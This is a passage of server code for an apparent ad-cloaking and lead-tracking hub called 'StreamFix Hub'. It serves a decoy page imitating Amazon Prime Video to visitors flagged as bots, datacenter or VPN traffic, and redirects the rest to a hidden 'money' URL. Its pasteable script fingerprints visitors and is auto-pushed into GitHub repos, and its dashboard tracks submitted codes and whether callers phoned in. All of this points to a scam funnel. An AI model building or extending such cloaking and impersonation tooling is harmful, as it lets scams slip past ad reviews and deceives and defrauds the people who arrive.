  // Re-inject if GitHub repo set and token available
  if (site.githubRepo && process.env.GITHUB_TOKEN) {
    githubInject(site, hubUrl).then(function() {}).catch(function() {});
  }

  var qs = site.isDefault ? '' : '?site=' + id;
  res.redirect('/admin' + qs);
});

app.post('/admin/sites/:id/regenerate-key', requireAdmin, async function(req, res) {
  var id = req.params.id;
  var sites = readSites();
  var idx = sites.findIndex(function(s) { return s.id === id; });
  if (idx === -1) return res.redirect('/admin');

  var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');
  sites[idx].apiKey = crypto.randomUUID();
  sites[idx].deployStatus = 'key-rotated';
  writeSites(sites);

  // Re-inject with new key
  if (sites[idx].githubRepo && process.env.GITHUB_TOKEN) {
    githubInject(sites[idx], hubUrl).then(function() {}).catch(function() {});
  }

  var qs = sites[idx].isDefault ? '' : '?site=' + id;
  res.redirect('/admin' + qs);
});

app.post('/admin/sites/:id/delete', requireAdmin, function(req, res) {
  var id = req.params.id;
  var sites = readSites();
  var site = sites.find(function(s) { return s.id === id; });
  if (!site || site.isDefault) return res.redirect('/admin'); // protect default
  writeSites(sites.filter(function(s) { return s.id !== id; }));
  res.redirect('/admin');
});

app.post('/admin/sites/:id/toggle', requireAdmin, function(req, res) {
  var id = req.params.id;
  var sites = readSites();
  var idx = sites.findIndex(function(s) { return s.id === id; });
  if (idx !== -1) { sites[idx].enabled = !sites[idx].enabled; writeSites(sites); }
  var qs = (sites[idx] && !sites[idx].isDefault) ? '?site=' + id : '';
  res.redirect('/admin' + qs);
});

// ─── Hub-hosted safe and money pages ─────────────────────────────────────────
app.get('/sites/:siteId/safe', function(req, res) {
  var sites = readSites();
  var site = sites.find(function(s) { return s.id === req.params.siteId; });
  var siteName = site ? escHtml(site.name) : 'this service';
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Amazon Prime Video</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0f171e;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:24px;padding:20px;text-align:center}
.logo{font-size:2rem;font-weight:800;color:#00a8e1;letter-spacing:-1px}
.logo span{color:#fff}
h1{font-size:1.4rem;font-weight:600;max-width:440px;line-height:1.4}
p{font-size:0.9rem;color:#aaa;max-width:400px;line-height:1.6}
.btn{display:inline-block;margin-top:10px;padding:12px 32px;background:#00a8e1;color:#fff;border-radius:4px;font-weight:700;text-decoration:none;font-size:0.95rem}
.btn:hover{background:#0095c8}
</style>
</head>
<body>
<div class="logo">amazon<span>prime</span></div>
<h1>Start your 30-day free trial</h1>
<p>Watch thousands of movies, TV shows, and more. Fast delivery, exclusive deals, and unlimited streaming included with Prime membership.</p>
<a href="https://www.amazon.com/tryprimefree" class="btn">Try Prime Free</a>
</body>
</html>`);
});

app.get('/sites/:siteId/money', function(req, res) {
  var sites = readSites();
  var site = sites.find(function(s) { return s.id === req.params.siteId; });
  var target = (site && site.moneyUrl) ? site.moneyUrl : '/';
  res.redirect(302, target);
});

// ─── Clean URLs ───────────────────────────────────────────────────────────────
app.get('/:page', function(req, res) {
  var page = req.params.page;
  var filePath = path.join(__dirname, 'public', page + '.html');
  res.sendFile(filePath, function(err) {
    if (err) res.status(404).sendFile(path.join(__dirname, 'public', 'index.html'));
  });
});

app.listen(PORT, '0.0.0.0', function() {
  console.log('Server running on port ' + PORT);
});

// ─── HTML templates ───────────────────────────────────────────────────────────
function adminLoginPage(errorHtml) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d0010;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#e0e0e0}
.card{background:#1a0d2e;border:1px solid #3d1f6e;border-radius:12px;padding:40px 36px;width:100%;max-width:380px;box-shadow:0 8px 40px rgba(0,0,0,0.5)}
h1{font-size:1.4rem;margin-bottom:6px;color:#c084fc}
.sub{font-size:0.82rem;color:#888;margin-bottom:28px}
label{display:block;font-size:0.82rem;color:#aaa;margin-bottom:6px}
input[type=password]{width:100%;padding:11px 14px;background:#0d0010;border:1px solid #3d1f6e;border-radius:8px;color:#e0e0e0;font-size:0.95rem;outline:none;transition:border .2s}
input[type=password]:focus{border-color:#a855f7}
button{width:100%;margin-top:20px;padding:12px;background:#7c3aed;color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:600;cursor:pointer;transition:background .2s}
button:hover{background:#6d28d9}
.error{color:#f87171;font-size:0.85rem;margin-top:14px;text-align:center}
</style>
</head>
<body>
<div class="card">
  <h1>Admin Panel</h1>
  <p class="sub">StreamFix Hub &mdash; Cloaking Control</p>
  <form method="POST" action="/admin/login">
    <label for="password">Password</label>
    <input type="password" id="password" name="password" autofocus autocomplete="current-password" placeholder="Enter admin password">
    <button type="submit">Sign In</button>
    ${errorHtml}
  </form>
</div>
</body>
</html>`;
}

function adminDashboardPage(settings, logs, leads, opts) {
  opts   = opts || {};
  leads  = Array.isArray(leads) ? leads : [];
  var logPage      = opts.logPage      || 1;
  var logTotal     = opts.logTotal     || logs.length;
  var leadPage     = opts.leadPage     || 1;
  var leadTotal    = opts.leadTotal    || leads.length;
  var activeCount  = opts.activeCount  || 0;
  var recentEvents = Array.isArray(opts.recentEvents) ? opts.recentEvents : [];
  var activeIpTimes = (opts.activeIpTimes && typeof opts.activeIpTimes === 'object') ? opts.activeIpTimes : {};
  var statsLogs    = Array.isArray(opts.allLogs)  ? opts.allLogs  : logs;
  var statsLeads   = Array.isArray(opts.allLeads) ? opts.allLeads : leads;
  var sites        = Array.isArray(opts.sites) ? opts.sites : [];
  var siteFilter   = opts.siteFilter || '';
  var selectedSite = opts.selectedSite || null;
  var hubUrl       = opts.hubUrl || '';
  var siteCreated  = opts.siteCreated || false;
  var hasGithubToken  = opts.hasGithubToken || false;
  var hasRailwayToken = opts.hasRailwayToken || false;
  var now = new Date();
  var today = now.toISOString().slice(0, 10);
  var timeStr = now.toUTCString().slice(17, 25);

  // ── Stats ─────────────────────────────────────────────────────────────────
  var todayLogs    = statsLogs.filter(function(l) { return l.ts && l.ts.startsWith(today); });
  var todayAllow   = todayLogs.filter(function(l) { return l.decision === 'allow'; }).length;
  var todayBlock   = todayLogs.filter(function(l) { return l.decision === 'block'; }).length;
  var todayTotal   = todayAllow + todayBlock;
  var allAllow     = statsLogs.filter(function(l) { return l.decision === 'allow'; }).length;
  var allBlock     = statsLogs.filter(function(l) { return l.decision === 'block'; }).length;
  var allTotal     = allAllow + allBlock;
  var blockRate    = allTotal > 0 ? Math.round(allBlock / allTotal * 100) : 0;

  // ── Top countries ─────────────────────────────────────────────────────────
  var countryCounts = {};
  statsLogs.forEach(function(l) {
    var cc = l.country || 'XX';
    countryCounts[cc] = (countryCounts[cc] || 0) + 1;
  });
  var flags = { US:'🇺🇸',GB:'🇬🇧',CA:'🇨🇦',AU:'🇦🇺',IN:'🇮🇳',DE:'🇩🇪',FR:'🇫🇷',PH:'🇵🇭',MX:'🇲🇽',BR:'🇧🇷',NL:'🇳🇱',SG:'🇸🇬',JP:'🇯🇵',NG:'🇳🇬',PK:'🇵🇰',ZA:'🇿🇦',XX:'🌐' };
  var topCountries = Object.keys(countryCounts)
    .sort(function(a,b){ return countryCounts[b]-countryCounts[a]; })
    .slice(0, 5);
  var maxCC = topCountries.length > 0 ? countryCounts[topCountries[0]] : 1;
  var countryRows = topCountries.map(function(cc) {
    var cnt = countryCounts[cc];
    var pct = Math.round(cnt / maxCC * 100);
    var flag = flags[cc] || '🌐';
    return '<div class="cc-row"><span class="cc-flag">' + flag + '</span><span class="cc-code">' + escHtml(cc) + '</span><div class="cc-bar-wrap"><div class="cc-bar" style="width:' + pct + '%"></div></div><span class="cc-cnt">' + cnt + '</span></div>';
  }).join('') || '<p class="empty">No data yet</p>';

  // ── Block reasons (including new ones) ────────────────────────────────────
  var reasonCounts = {};
  statsLogs.filter(function(l){ return l.decision === 'block'; }).forEach(function(l) {
    var r = l.reason || 'unknown';
    reasonCounts[r] = (reasonCounts[r] || 0) + 1;
  });
  var reasonOrder = [
    'repeat-click','manual-block','country-block',
    'bot-ua','datacenter','proxy-vpn','suspicious-isp',
    'webdriver','no-screen','headless-screen','no-plugins-desktop'
  ];
  var reasonColors = {
    'repeat-click':'orange','manual-block':'orange','country-block':'orange',
    'bot-ua':'amber','webdriver':'amber','no-screen':'amber','headless-screen':'amber','no-plugins-desktop':'amber',
    'datacenter':'red','proxy-vpn':'red','suspicious-isp':'red'
  };
  var reasonPills = reasonOrder.filter(function(r){ return reasonCounts[r] > 0; }).map(function(r) {
    var col = reasonColors[r] || 'grey';
    return '<span class="pill pill-' + col + '">' + escHtml(r) + ' <strong>' + reasonCounts[r] + '</strong></span>';
  }).join('') || '<span class="empty">No blocks yet</span>';

  // ── Toggle ────────────────────────────────────────────────────────────────
  var toggleLabel  = settings.enabled ? 'Disable Cloaking' : 'Enable Cloaking';
  var pulseDot     = settings.enabled ? '<span class="pulse-dot"></span>' : '';
  var statusBadge  = settings.enabled
    ? pulseDot + '<span class="badge on">ENABLED</span>'
    : '<span class="badge off">DISABLED</span>';

  // ── Current traffic control state ────────────────────────────────────────
  var blockedIpsList    = Array.isArray(settings.blockedIps) ? settings.blockedIps : [];
  var allowedCountriesList = Array.isArray(settings.allowedCountries) ? settings.allowedCountries : [];
  var freqStoreSize     = ipFreqStore.size;
  var repeatClicksIn24h = statsLogs.filter(function(l) {
    return l.decision === 'block' && l.reason === 'repeat-click' && l.ts &&
      (Date.now() - new Date(l.ts).getTime()) < IP_FREQ_WINDOW_MS;
  }).length;

  // ── Log rows ──────────────────────────────────────────────────────────────
  function deviceType(ua) {
    if (!ua) return '—';
    if (/ipad|tablet|kindle|playbook|(android(?!.*mobile))/i.test(ua)) return 'Tablet';
    if (/mobile|iphone|ipod|android|blackberry|opera mini|iemobile|wpdesktop/i.test(ua)) return 'Mobile';
    return 'Desktop';
  }
  function locationStr(l) {
    if (!l.city) return escHtml(l.country || 'XX');
    var parts = [escHtml(l.city)];
    if (l.region) parts.push(escHtml(l.region));
    parts.push(escHtml(l.country || 'XX'));
    return parts.join(', ');
  }
  function reasonPill(r) {
    var col = {
      clean:'green',
      'repeat-click':'orange','manual-block':'orange','country-block':'orange',
      'bot-ua':'amber',webdriver:'amber','no-screen':'amber','headless-screen':'amber','no-plugins-desktop':'amber',
      datacenter:'red','proxy-vpn':'red','suspicious-isp':'red',
      disabled:'grey'
    }[r] || 'grey';
    return '<span class="rpill rpill-' + col + '">' + escHtml(r || '') + '</span>';
  }
  var logRows = logs.map(function(l) {
    var cls    = l.decision === 'allow' ? 'allow' : 'block';
    var ts     = l.ts ? l.ts.replace('T',' ').slice(0,19) : '';
    var isp    = (l.isp || '').slice(0, 22);
    var screen = (!l.screen || l.screen === '0x0') ? '—' : escHtml(l.screen);
    var device = deviceType(l.ua || '');
    return '<tr>'
      + '<td class="mono">' + ts + '</td>'
      + '<td class="mono">' + escHtml(l.ip || '') + '</td>'
      + '<td>' + locationStr(l) + '</td>'
      + '<td class="isp" title="' + escHtml(l.isp || '') + '">' + escHtml(isp) + '</td>'
      + '<td class="mono">' + screen + '</td>'
      + '<td>' + escHtml(device) + '</td>'
      + '<td class="ua">' + escHtml((l.ua || '').slice(0, 50)) + '</td>'
      + '<td class="' + cls + '">' + escHtml(l.decision || '') + '</td>'
      + '<td>' + reasonPill(l.reason) + '</td>'
      + '</tr>';
  }).join('');

  // ── Blocked IP export count (for Google Ads card) ────────────────────────
  var exportSeen = {};
  var privateRe  = /^(127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|::1$|fd)/;
  (blockedIpsList).forEach(function(ip) { if (ip && !privateRe.test(ip)) exportSeen[ip] = true; });
  statsLogs.filter(function(l){ return l.decision === 'block' && l.ip; })
      .forEach(function(l){ if (!privateRe.test(l.ip)) exportSeen[l.ip] = true; });
  var exportCount = Object.keys(exportSeen).length;

  // ── Leads stats ───────────────────────────────────────────────────────────
  var allSubmits   = statsLeads.filter(function(l) { return l.type === 'code_submit'; });
  var submits      = leads.filter(function(l) { return l.type === 'code_submit'; });
  var todaySubmits = allSubmits.filter(function(l) { return l.ts && l.ts.startsWith(today); });
  var calledLeads  = allSubmits.filter(function(l) { return l.called; });
  var callRate     = allSubmits.length > 0 ? Math.round(calledLeads.length / allSubmits.length * 100) : 0;

  function adSource(l) {
    if (l.gclid) return '<span class="rpill rpill-amber">Google Ads</span>';
    var src = l.utm_campaign || l.utm_source || '';
    return src ? '<span style="font-size:0.72rem;color:#a78bfa">' + escHtml(src.slice(0, 20)) + '</span>' : '—';
  }

  var leadRows = submits.map(function(l) {
    var ts     = l.ts ? l.ts.replace('T',' ').slice(0,19) : '';
    var device = deviceType(l.ua || '');
    var calledBadge = l.called
      ? '<span class="rpill rpill-green">Yes</span>'
      : '<span class="rpill rpill-grey">No</span>';
    return '<tr>'
      + '<td class="mono">' + ts + '</td>'
      + '<td class="mono">' + escHtml(l.ip || '') + '</td>'
      + '<td>' + locationStr(l) + '</td>'
      + '<td>' + escHtml(device) + '</td>'
      + '<td class="mono" style="color:#c084fc;font-weight:700">' + escHtml(l.code || '') + '</td>'
      + '<td>' + adSource(l) + '</td>'
      + '<td>' + calledBadge + '</td>'
      + '</tr>';
  }).join('');

  // ── Pagination helpers ────────────────────────────────────────────────────
  function paginationHtml(currentPage, total, pageSize, paramName, otherParam, otherVal) {
    var totalPages = Math.max(1, Math.ceil(total / pageSize));
    if (totalPages <= 1) return '';
    var prev = currentPage > 1 ? currentPage - 1 : null;
    var next = currentPage < totalPages ? currentPage + 1 : null;
    function href(p) {
      var params = paramName + '=' + p;
      if (otherParam && otherVal > 1) params += '&amp;' + otherParam + '=' + otherVal;
      if (siteFilter) params += '&amp;site=' + encodeURIComponent(siteFilter);
      return '/admin?' + params;
    }
    return '<div class="pagination">'
      + (prev ? '<a href="' + href(prev) + '" class="pag-btn">&larr; Prev</a>' : '<span class="pag-btn pag-disabled">&larr; Prev</span>')
      + '<span class="pag-info">Page ' + currentPage + ' of ' + totalPages + ' &nbsp;(&nbsp;' + total + ' total&nbsp;)</span>'
      + (next ? '<a href="' + href(next) + '" class="pag-btn">Next &rarr;</a>' : '<span class="pag-btn pag-disabled">Next &rarr;</span>')
      + '</div>';
  }
  var logPaginationHtml  = paginationHtml(logPage,  logTotal,  LOG_PAGE_SIZE,  'logPage',  'leadPage', leadPage);
  var leadPaginationHtml = paginationHtml(leadPage, leadTotal, LEAD_PAGE_SIZE, 'leadPage', 'logPage',  logPage);

  // ── Site selector bar ─────────────────────────────────────────────────────
  var siteOptions = sites.map(function(s) {
    var sel = s.id === siteFilter ? ' selected' : '';
    return '<option value="' + escHtml(s.id) + '"' + sel + '>' + escHtml(s.name) + (s.isDefault ? ' (default)' : '') + '</option>';
  }).join('');

  var siteBarHtml = '<div class="site-bar">'
    + '<label for="siteSelector">Viewing:</label>'
    + '<select class="site-select" id="siteSelector" onchange="window.location=\'/admin\'+(this.value?\'?site=\'+this.value:\'\')">'
    + '<option value=""' + (!siteFilter ? ' selected' : '') + '>All Sites</option>'
    + siteOptions
    + '</select>'
    + (siteFilter ? '<span class="site-filter-badge">Filtered to: ' + escHtml((selectedSite ? selectedSite.name : siteFilter)) + '</span>' : '')
    + (siteCreated ? '<span class="site-created-flash">&#10003; Site created! Script is being pushed to GitHub&hellip;</span>' : '')
    + (!hasGithubToken ? '<span style="font-size:0.72rem;color:#f87171">&#9888; GITHUB_TOKEN not set — auto-inject disabled</span>' : '')
    + '</div>';

  // ── Sites management card ─────────────────────────────────────────────────
  function deployBadge(status) {
    var cls = { live:'db-live', pushed:'db-pushed', pending:'db-pending', failed:'db-failed', 'key-rotated':'db-rotated' }[status] || 'db-pending';
    var label = { live:'Live', pushed:'Pushed to GitHub', pending:'Pending', failed:'Failed', 'key-rotated':'Key Rotated' }[status] || (status || 'Unknown');
    return '<span class="deploy-badge ' + cls + '">' + escHtml(label) + '</span>';
  }

  function siteSnippet(s) {
    if (!s.apiKey) return '';
    var safeHref = s.safeUrl || hubUrl + '/sites/' + s.id + '/safe';
    var moneyHref = hubUrl + '/sites/' + s.id + '/money';
    var snip = '<!-- Paste this inside <head> on your landing page -->\n'
      + '<!-- StreamFix-Hub-Start -->\n'
      + '<script>\n'
      + '(function(){\n'
      + '  var _h=\'' + hubUrl + '\',_k=\'' + s.apiKey + '\';\n'
      + '  try{\n'
      + '    fetch(_h+\'/api/cloak\',{\n'
      + '      method:\'POST\',\n'
      + '      headers:{\'Content-Type\':\'application/json\',\'X-Site-Key\':_k},\n'
      + '      body:JSON.stringify({\n'
      + '        ua:navigator.userAgent,sw:screen.width,sh:screen.height,\n'
      + '        wd:!!navigator.webdriver,\n'
      + '        pl:(navigator.plugins||[]).length,\n'
      + '        tz:Intl.DateTimeFormat().resolvedOptions().timeZone\n'
      + '      })\n'
      + '    }).then(function(r){return r.json()})\n'
      + '    .then(function(d){if(d&&d.url)window.location.replace(d.url)})\n'
      + '    .catch(function(){});\n'
      + '  }catch(e){}\n'
      + '})();\n'
      + '<\/script>\n'
      + '<!-- StreamFix-Hub-End -->';
    return snip;
  }

  var nonDefaultSites = sites.filter(function(s) { return !s.isDefault; });

  var siteRowsHtml = nonDefaultSites.map(function(s, idx) {
    var safeHref = hubUrl + '/sites/' + s.id + '/safe';
    var moneyHref = hubUrl + '/sites/' + s.id + '/money';
    var snippet = siteSnippet(s);
    var snippetId = 'snip-' + escHtml(s.id);
    var panelId = 'panel-' + escHtml(s.id);
    var maskedKey = s.apiKey ? s.apiKey.slice(0, 8) + '••••••••-••••-••••-••••-••••••••' + s.apiKey.slice(-4) : '—';
    var lastPushed = s.lastPushed ? ' · Pushed ' + s.lastPushed.replace('T', ' ').slice(0, 16) + ' UTC' : '';
    var injected = (s.injectedFiles && s.injectedFiles.length) ? ' · Files: ' + escHtml(s.injectedFiles.join(', ')) : '';

    return '<div class="site-row">'
      + '<div class="site-row-hdr">'
      +   '<span class="site-name">' + escHtml(s.name) + '</span>'
      +   '<span class="site-domain">' + escHtml(s.domain || '') + '</span>'
      +   deployBadge(s.deployStatus || 'pending')
      +   '<span style="font-size:0.68rem;color:#444">' + escHtml(lastPushed + injected) + '</span>'
      +   (s.enabled === false ? '<span class="rpill rpill-grey" style="margin-left:auto">DISABLED</span>' : '<span class="rpill rpill-green" style="margin-left:auto">ACTIVE</span>')
      + '</div>'

      + '<div class="site-key-wrap">'
      +   '<span class="site-key-val" id="keyval-' + escHtml(s.id) + '" title="' + escHtml(s.apiKey || '') + '">' + escHtml(maskedKey) + '</span>'
      +   '<button class="copy-btn" onclick="copyKey(\'keyval-' + escHtml(s.id) + '\',\'' + escHtml(s.apiKey || '') + '\',this)">Copy Key</button>'
      + '</div>'

      + '<div class="site-urls">'
      +   '<span class="site-url-chip">Safe page: <a href="' + escHtml(safeHref) + '" target="_blank">' + escHtml(safeHref) + '</a></span>'
      +   '<span class="site-url-chip">Money redirect: <a href="' + escHtml(moneyHref) + '" target="_blank">' + escHtml(moneyHref) + '</a></span>'
      + '</div>'

      + '<div class="snippet-wrap">'
      +   '<button class="snippet-toggle" onclick="toggleSnippet(\'' + snippetId + '\',this)">&lt;/&gt; Show integration script &mdash; paste this in your site\'s &lt;head&gt;</button>'
      +   '<div class="snippet-box" id="' + snippetId + '">'
      +     '<button class="snippet-copy" onclick="copySnippet(\'' + snippetId + '\',this)">Copy</button>'
      +     escHtml(snippet)
      +   '</div>'
      + '</div>'

      + '<div class="site-actions">'
      +   '<button class="site-details-toggle" onclick="togglePanel(\'' + panelId + '\',this)">&#9881; Settings</button>'
      +   '<form method="POST" action="/admin/sites/' + escHtml(s.id) + '/toggle" class="inline">'
      +     '<button type="submit" class="' + (s.enabled !== false ? 'btn-danger' : 'btn-success') + ' btn-sm">' + (s.enabled !== false ? 'Pause Site' : 'Resume Site') + '</button>'
      +   '</form>'
      +   '<form method="POST" action="/admin/sites/' + escHtml(s.id) + '/regenerate-key" class="inline" onsubmit="return confirm(\'Regenerate API key? The old key stops working immediately. A new script will be pushed to GitHub.\')">'
      +     '<button type="submit" class="btn-sm" style="background:#1e1a3a;border:1px solid #7c3aed;color:#a78bfa">&#8635; New Key</button>'
      +   '</form>'
      +   '<form method="POST" action="/admin/sites/' + escHtml(s.id) + '/delete" class="inline" onsubmit="return confirm(\'Delete site ' + escHtml(s.name) + '? This cannot be undone.\')">'
      +     '<button type="submit" class="btn-danger btn-sm">Delete</button>'
      +   '</form>'
      +   '<a href="/admin?site=' + escHtml(s.id) + '" class="btn-sm" style="display:inline-block;padding:6px 13px;background:#0d0018;border:1px solid #2e1655;border-radius:8px;color:#888;font-size:0.78rem;text-decoration:none">Filter Logs</a>'
      + '</div>'

      + '<div class="site-settings-panel" id="' + panelId + '">'
      +   '<form method="POST" action="/admin/sites/' + escHtml(s.id) + '/settings">'
      +     '<div class="form-grid2">'
      +       '<div><label>Site Name</label><input type="text" name="name" value="' + escHtml(s.name || '') + '"></div>'
      +       '<div><label>Domain</label><input type="text" name="domain" value="' + escHtml(s.domain || '') + '" placeholder="example.com"></div>'
      +     '</div>'
      +     '<div class="form-grid2" style="margin-top:10px">'
      +       '<div><label>Money URL</label><input type="text" name="moneyUrl" value="' + escHtml(s.moneyUrl || '') + '" placeholder="https://your-offer-page.com"></div>'
      +       '<div><label>Safe URL <span style="color:#555">(defaults to hub-hosted)</span></label><input type="text" name="safeUrl" value="' + escHtml(s.safeUrl || '') + '" placeholder="' + escHtml(safeHref) + '"></div>'
      +     '</div>'
      +     '<div class="form-grid2" style="margin-top:10px">'
      +       '<div><label>GitHub Repo URL</label><input type="text" name="githubRepo" value="' + escHtml(s.githubRepo || '') + '" placeholder="https://github.com/user/repo"></div>'
      +       '<div><label>Allowed Countries <span style="color:#555">(blank = all)</span></label><input type="text" name="allowedCountries" value="' + escHtml((s.allowedCountries || []).join(', ')) + '" placeholder="US CA GB"></div>'
      +     '</div>'
      +     '<div class="form-grid2" style="margin-top:10px">'
      +       '<div><label>Railway Project ID <span style="color:#555">(optional)</span></label><input type="text" name="railwayProjectId" value="' + escHtml(s.railwayProjectId || '') + '" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"></div>'
      +       '<div><label>Railway Service ID <span style="color:#555">(optional)</span></label><input type="text" name="railwayServiceId" value="' + escHtml(s.railwayServiceId || '') + '" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"></div>'
      +     '</div>'
      +     '<div style="margin-top:10px">'
      +       '<label>Permanently Blocked IPs (one per line)</label>'
      +       '<textarea name="blockedIps" rows="3">' + escHtml((s.blockedIps || []).join('\n')) + '</textarea>'
      +     '</div>'
      +     '<button type="submit" class="btn-primary" style="margin-top:12px;width:100%">Save &amp; Push to GitHub</button>'
      +   '</form>'
      + '</div>'
      + '</div>';
  }).join('');

  var sitesCardHtml = '<div class="card" style="margin-bottom:18px">'
    + '<h2>Connected Sites (' + sites.length + ')</h2>'

    + (!hasGithubToken ? '<div style="background:#2d0808;border:1px solid #7f1d1d;border-radius:8px;padding:12px;margin-bottom:14px;font-size:0.78rem;color:#fca5a5">'
      + '<strong>GitHub token not configured.</strong> Auto-inject and auto-deploy are disabled. '
      + 'Set the <code>GITHUB_TOKEN</code> secret (a GitHub Personal Access Token with <code>repo</code> scope) to enable them. '
      + 'You can still add sites and use the manual script snippet.'
      + '</div>' : '')

    + siteRowsHtml

    + '<div style="border-top:1px solid #1f1035;margin-top:14px;padding-top:14px">'
    + '<p style="font-size:0.78rem;color:#a78bfa;font-weight:700;margin-bottom:10px">&#43; Add New Site</p>'
    + '<form method="POST" action="/admin/sites">'
    +   '<div class="form-grid2">'
    +     '<div><label>Site Name *</label><input type="text" name="name" placeholder="My Peacock Site" required></div>'
    +     '<div><label>Domain</label><input type="text" name="domain" placeholder="mypeacocksite.com"></div>'
    +   '</div>'
    +   '<div class="form-grid2" style="margin-top:10px">'
    +     '<div><label>GitHub Repo URL</label><input type="text" name="githubRepo" placeholder="https://github.com/user/repo"></div>'
    +     '<div><label>Money URL</label><input type="text" name="moneyUrl" placeholder="https://your-offer-page.com"></div>'
    +   '</div>'
    +   '<p class="hint" style="margin-top:8px">When you click Add Site: an API key is generated, safe &amp; money pages are created on this hub, and the cloaking script is automatically pushed to your GitHub repo (if token is set and repo is provided).</p>'
    +   '<button type="submit" class="btn-primary" style="margin-top:12px">Add Site &rarr;</button>'
    + '</form>'
    + '</div>'
    + '</div>';

  // ── Recent events for live feed (server-rendered initial state) ───────────
  function liveRow(l) {
    var ts  = l.ts ? l.ts.replace('T',' ').slice(0,19) : '';
    var loc = (l.city ? escHtml(l.city) + ', ' : '') + escHtml(l.country || 'XX');
    var cls = l.decision === 'allow' ? 'lf-allow' : 'lf-block';
    return '<div class="lf-row"><span class="lf-ts">' + ts + '</span>'
      + '<span class="lf-ip">' + escHtml(l.ip || '') + '</span>'
      + '<span class="lf-loc">' + loc + '</span>'
      + '<span class="lf-dec ' + cls + '">' + escHtml(l.decision || '') + '</span>'
      + '<span class="lf-reason">' + escHtml(l.reason || '') + '</span></div>';
  }
  var liveInitRows = recentEvents.map(liveRow).join('');
  var activeIpTimesJson = JSON.stringify(activeIpTimes)
    .replace(/</g, '\\u003c').replace(/>/g, '\\u003e').replace(/&/g, '\\u0026');

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cloaking Admin — StreamFix Hub</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#08050f;color:#e0e0e0;min-height:100vh}

header{background:#120824;border-bottom:1px solid #2e1655;padding:14px 28px;display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:10px}
.hdr-left h1{font-size:1.05rem;color:#c084fc;font-weight:700;margin-bottom:4px}
.hdr-urls{font-size:0.74rem;color:#6b6b8a}
.hdr-urls span{color:#a78bfa}
.hdr-right{display:flex;align-items:center;gap:14px;flex-wrap:wrap}
.hdr-time{font-size:0.75rem;color:#555;white-space:nowrap}
.hdr-right a{color:#888;font-size:0.8rem;text-decoration:none}
.hdr-right a:hover{color:#c084fc}

/* ── Notification bell ── */
.notif-wrap{position:relative}
.notif-btn{background:none;border:none;cursor:pointer;padding:5px 7px;border-radius:8px;transition:background .2s;display:flex;align-items:center;justify-content:center;color:#888}
.notif-btn:hover{background:#1a0d2e;color:#c084fc}
.notif-badge{position:absolute;top:-2px;right:-2px;background:#ef4444;color:#fff;font-size:0.6rem;font-weight:800;border-radius:10px;padding:1px 5px;min-width:16px;text-align:center;display:none;line-height:1.4}
.notif-badge.show{display:block}
.notif-dropdown{position:absolute;top:calc(100% + 10px);right:0;width:340px;background:#120824;border:1px solid #2e1655;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.6);z-index:999;display:none}
.notif-dropdown.open{display:block}
.notif-hdr{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;border-bottom:1px solid #2e1655}
.notif-hdr span{font-size:0.78rem;font-weight:700;color:#a78bfa;text-transform:uppercase;letter-spacing:1px}
.notif-clear{background:none;border:none;color:#555;font-size:0.72rem;cursor:pointer;padding:3px 7px;border-radius:6px;transition:color .2s}
.notif-clear:hover{color:#f87171}
.notif-list{max-height:320px;overflow-y:auto}
.notif-item{padding:10px 16px;border-bottom:1px solid #160928;display:flex;flex-direction:column;gap:3px}
.notif-item:last-child{border-bottom:none}
.notif-item-top{display:flex;justify-content:space-between;align-items:center}
.notif-ip{font-size:0.75rem;font-family:'SF Mono',Menlo,monospace;color:#c084fc}
.notif-time{font-size:0.68rem;color:#444}
.notif-loc{font-size:0.72rem;color:#777}
.notif-dec-allow{color:#4ade80;font-size:0.72rem;font-weight:700}
.notif-dec-block{color:#f87171;font-size:0.72rem;font-weight:700}
.notif-empty{padding:20px 16px;text-align:center;color:#444;font-size:0.78rem;font-style:italic}
/* ── Sound toggle ── */
.sound-btn{background:none;border:none;cursor:pointer;padding:5px 7px;border-radius:8px;transition:background .2s;color:#888;display:flex;align-items:center}
.sound-btn:hover{background:#1a0d2e;color:#c084fc}
.sound-btn.muted{color:#444}

.container{max-width:1260px;margin:0 auto;padding:24px 18px}

/* ── Grid layouts ── */
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-bottom:18px}
.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:18px;margin-bottom:18px}
@media(max-width:900px){.grid2,.grid3{grid-template-columns:1fr}}

/* ── Card ── */
.card{background:#1a0d2e;border:1px solid #2e1655;border-radius:12px;padding:22px}
.card h2{font-size:0.78rem;text-transform:uppercase;letter-spacing:1.2px;color:#a78bfa;margin-bottom:16px;font-weight:700}

/* ── Badge / status ── */
.badge{display:inline-block;padding:3px 12px;border-radius:20px;font-size:0.75rem;font-weight:700;letter-spacing:0.5px;vertical-align:middle}
.badge.on{background:#14532d;color:#4ade80}
.badge.off{background:#450a0a;color:#f87171}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.25}}
.pulse-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#4ade80;animation:pulse 1.5s infinite;margin-right:7px;vertical-align:middle}

/* ── Buttons ── */
